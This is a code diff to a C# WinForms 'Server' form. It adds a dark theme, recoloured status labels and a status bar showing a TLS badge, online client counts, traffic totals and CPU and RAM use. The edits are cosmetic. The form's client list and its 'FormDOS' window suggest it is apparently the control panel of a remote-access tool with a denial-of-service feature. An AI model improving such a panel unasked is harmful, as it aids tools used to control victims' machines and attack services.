@@ -39,7 +39,14 @@ namespace Server
         public Form1()
         {
             InitializeComponent();
-            SetWindowTheme(listView1.Handle, "explorer", null);
+            // Apply dark theme before the form becomes visible
+            DarkTheme.Apply(this);
+            DarkTheme.ApplyDwmDarkTitleBar(this.Handle);
+            // Use Windows' built-in DarkMode_Explorer theme for all list views
+            SetWindowTheme(listView1.Handle, "DarkMode_Explorer", null);
+            SetWindowTheme(listView2.Handle, "DarkMode_Explorer", null);
+            SetWindowTheme(listView3.Handle, "DarkMode_Explorer", null);
+            SetWindowTheme(listView4.Handle, "DarkMode_Explorer", null);
             this.Opacity = 0;
             formDOS = new FormDOS
             {
@@ -175,11 +182,11 @@ namespace Server
 
             if (Properties.Settings.Default.Notification == true)
             {
-                toolStripStatusLabel2.ForeColor = Color.Green;
+                toolStripStatusLabel2.ForeColor = DarkTheme.AccentGreen;
             }
             else
             {
-                toolStripStatusLabel2.ForeColor = Color.Black;
+                toolStripStatusLabel2.ForeColor = DarkTheme.TextMuted;
             }
 
             new Thread(() =>
@@ -250,12 +257,12 @@ namespace Server
             if (Properties.Settings.Default.Notification == true)
             {
                 Properties.Settings.Default.Notification = false;
-                toolStripStatusLabel2.ForeColor = Color.Black;
+                toolStripStatusLabel2.ForeColor = DarkTheme.TextMuted;
             }
             else
             {
                 Properties.Settings.Default.Notification = true;
-                toolStripStatusLabel2.ForeColor = Color.Green;
+                toolStripStatusLabel2.ForeColor = DarkTheme.AccentGreen;
             }
             Properties.Settings.Default.Save();
         }
@@ -281,8 +288,34 @@ namespace Server
         private void UpdateUI_Tick(object sender, EventArgs e)
         {
             Text = $"{Settings.Version}     {DateTime.Now.ToLongTimeString()}";
+
+            int cpu, ram;
             lock (Settings.LockListviewClients)
-                toolStripStatusLabel1.Text = $"Online {listView1.Items.Count.ToString()}     Selected {listView1.SelectedItems.Count.ToString()}                    Sent {Methods.BytesToString(Settings.SentValue).ToString()}     Received {Methods.BytesToString(Settings.ReceivedValue).ToString()}                    CPU {(int)performanceCounter1.NextValue()}%     RAM {(int)performanceCounter2.NextValue()}%";
+            {
+                cpu = (int)performanceCounter1.NextValue();
+                ram = (int)performanceCounter2.NextValue();
+
+                int onlineCount    = listView1.Items.Count;
+                int selectedCount  = listView1.SelectedItems.Count;
+
+                // Colour the online/selected portion: green when clients exist, muted when empty
+                toolStripStatusLabel1.ForeColor = onlineCount > 0 ? DarkTheme.AccentGreen : DarkTheme.TextMuted;
+
+                toolStripStatusLabel1.Text =
+                    $"\U0001f512 TLS   " +
+                    $"Online {onlineCount}  " +
+                    $"Selected {selectedCount}     " +
+                    $"Sent {Methods.BytesToString(Settings.SentValue)}  " +
+                    $"Recv {Methods.BytesToString(Settings.ReceivedValue)}     " +
+                    $"CPU {cpu}%  " +
+                    $"RAM {ram}%";
+            }
+
+            // Dynamic CPU colour: normal → yellow → red
+            if (cpu >= 90)
+                toolStripStatusLabel1.ForeColor = DarkTheme.AccentRed;
+            else if (cpu >= 70)
+                toolStripStatusLabel1.ForeColor = DarkTheme.AccentYellow;
         }
 
         #endregion
